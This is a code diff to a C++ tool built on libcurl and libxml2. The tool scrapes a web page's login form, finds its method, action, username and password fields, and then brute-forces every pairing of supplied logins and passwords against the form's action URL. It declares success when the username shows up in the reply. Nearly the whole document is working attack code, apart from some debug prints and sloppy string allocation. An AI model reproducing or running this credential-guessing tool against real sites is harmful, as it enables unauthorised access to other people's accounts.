@@ -13,10 +13,10 @@ using namespace std;
 
 struct Context{
 	Context(): containsForm(false) { }
-	const xmlChar* formMethod = NULL;
-	const xmlChar* login = NULL;
-	const xmlChar* password = NULL;
-	const xmlChar* action = NULL;
+	char* formMethod = NULL;
+	char* login = NULL;
+	char* password = NULL;
+	char* action = NULL;
 	bool containsForm;
 } form;
 
@@ -25,6 +25,8 @@ struct Context{
 
 static char errorBuffer[CURL_ERROR_SIZE];
 static string buffer;
+static string bufferNewHost;
+bool successfulLogin = false;
 
 static const char* possibleLoginFields[] = {"login", "your_email", "username"}; // Possible login fields names
 
@@ -154,11 +156,13 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 
 		if(tempFormMethod){
 			form.containsForm = true;
-			form.formMethod = (xmlChar*)malloc((strlen((char*)tempFormMethod))*sizeof(xmlChar*));
-			strcpy((char*)form.formMethod, (char*)tempFormMethod);
+			form.formMethod = (char*)malloc((strlen((char*)tempFormMethod))*sizeof(xmlChar*));
+			strcpy(form.formMethod, (char*)tempFormMethod);
 			printf("=== Found method tag  = %s \n", form.formMethod);
-			form.action = findElementValueByType(attributes, "action");
-			if(form.action){
+			const xmlChar* tempAction = findElementValueByType(attributes, "action");
+			if(tempAction){
+				form.action = (char*)malloc((strlen((char*)tempAction))*sizeof(xmlChar*));
+				strcpy(form.action, (char*)tempAction);
 				printf("=== Found action tag inside form  = %s \n", form.action);
 			}
 		} else {
@@ -169,8 +173,8 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 		if(!form.password) {
 			const xmlChar* tempFormPassword = findElementNameByType(attributes, "password");
 			if(tempFormPassword){
-				form.password = (xmlChar*)malloc((strlen((char*)tempFormPassword))*sizeof(xmlChar*));
-				strcpy((char*)form.password, (char*)tempFormPassword);
+				form.password = (char*)malloc((strlen((char*)tempFormPassword))*sizeof(xmlChar*));
+				strcpy(form.password, (char*)tempFormPassword);
 				printf("=== Found password  = %s \n", form.password);
 			}
 		}
@@ -179,8 +183,8 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 			if(tempFormLogin){
 				for(int i = 0; i<3; i++){
 					if(!strcasecmp((char*)tempFormLogin, possibleLoginFields[i])){
-						form.login = (xmlChar*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
-						strcpy((char*)form.login, (char*)tempFormLogin);
+						form.login = (char*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
+						strcpy(form.login, (char*)tempFormLogin);
 						printf("=== Found login  = %s \n", form.login);
 					}
 				}
@@ -245,9 +249,13 @@ static void parseHtml(const std::string &html){
 	htmlFreeParserCtxt(ctxt);
 }
 
-string* concat(const xmlChar *login, string loginValue,const xmlChar *password, string passwordValue){
+string* concat(char* action, const char *login, string loginValue, const char *password, string passwordValue){
 	string* result = new string;
 
+	if(action){
+		result->append(action);
+		result->append("?");
+	}
 	result->append((char*)login);
 	result->append("=");
 	result->append(loginValue);
@@ -259,35 +267,66 @@ string* concat(const xmlChar *login, string loginValue,const xmlChar *password, 
 	return result;
 }
 
-static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passwords, Context& form, CURL* conn){
+static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passwords, Context& form, char* action){
 	string *data;
-	size_t lenLogin = 0;
-	size_t lenPassword = 0;
-	CURLcode res;
+	CURLcode code;
+	CURL *curl;
+	string respBuffer;
+	curl_global_init(CURL_GLOBAL_ALL);
+	curl = curl_easy_init();
+	if(!curl){
+		cerr<<"curl initialization error \n";
+		return ;
+	}
 
+	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
+	if (code != CURLE_OK){
+		fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);
+		return ;
+	}
+
+	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &respBuffer);
+	if (code != CURLE_OK){
+		fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
+		return ;
+	}
+
+	cout<<__LINE__<<endl;
 	//Brute force for all combinations of the given logins and passwords
 	for (list<string>::iterator loginIt = logins.begin(); loginIt != logins.end(); ++loginIt){
+		cout<<__LINE__<<endl;
 		for (list<string>::iterator passwordIt = passwords.begin(); passwordIt != passwords.end(); ++passwordIt){
-			data = concat(form.login, *loginIt, form.password, *passwordIt);
-			cout<<*data<<endl;
+
 			if(!strcasecmp((char*)form.formMethod, "post")){
-				curl_easy_setopt(conn, CURLOPT_POSTFIELDS, data);
+				curl_easy_setopt(curl, CURLOPT_URL,  action);
+				data = concat(NULL, form.login, *loginIt, form.password, *passwordIt);
+				cout<<*data<<endl;
+				cout<<"action = "<<action<<endl;
+				curl_easy_setopt(curl, CURLOPT_POST, 1);
+				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data->c_str());
 			} else if(!strcasecmp((char*)form.formMethod, "get")){
-				curl_easy_setopt(conn, CURLOPT_URL,  data);
+				cout<<__LINE__<<endl;
+				data = concat(action, form.login, *loginIt, form.password, *passwordIt);
+				cout<<*data<<endl;
+				curl_easy_setopt(curl, CURLOPT_URL,  data->c_str());
 			}
-			free(data);
+
 			cout<<"perform some attack \n";
-			res = curl_easy_perform(conn);
-			if(res != CURLE_OK){
+			respBuffer.clear();
+			code = curl_easy_perform(curl);
+			if(code != CURLE_OK){
 				fprintf(stderr, "curl_easy_perform() failed: %s\n",
-				curl_easy_strerror(res));
+				curl_easy_strerror(code));
+				break;
 			}
-			//Check if login exists inside replied page, if found one probably you logged int
-			if(buffer.find(*loginIt) != string::npos){
+			cout<<__LINE__<<endl;
+
+			//cout<<"respBuffer"<<respBuffer<<endl;
+			if (strstr(respBuffer.c_str(), (*loginIt).c_str()) != NULL){
 				cout<<"Congradulation you have logged in\n";
 				cout<<"Login ="<<*loginIt<<" Password ="<<*passwordIt<<endl;
 				return;
-			}
+			 }
 		}
 	}
 	cout<<"There is no login or password correspondance \n";
@@ -304,16 +343,23 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 
 	// Retrieve content for the URL
 	code = curl_easy_perform(conn);
-
+	cout<<__LINE__<<endl;
 	if (code != CURLE_OK) {
 		fprintf(stderr, "Failed to get  [%s]\n", errorBuffer);
 
 		return false;
 	}
 
+	cout<<__LINE__<<endl;
 	// Parse the (assumed) HTML code
 
 	parseHtml(buffer);
+
+	if(!form.action){
+		fprintf(stderr, "There is no action in the given page \n");
+
+		exit(EXIT_FAILURE);
+	}
 
 	if(!form.containsForm){
 		fprintf(stderr, "There is no form in the given page \n");
@@ -326,6 +372,12 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 
 		exit(EXIT_FAILURE);
 	}
-	bruteForceLoginAndPassword(logins, passwords, form, conn);
+	curl_easy_cleanup(conn);
+	curl_global_cleanup();
+	string first(form.action);
+	string newHost = hostName + "/" + first;
+	cout<<"new host name ="<<newHost<<endl;
+	cout<<"after c_str ="<<newHost.c_str()<<endl;
+	bruteForceLoginAndPassword(logins, passwords, form, (char*)newHost.c_str());
 }
 
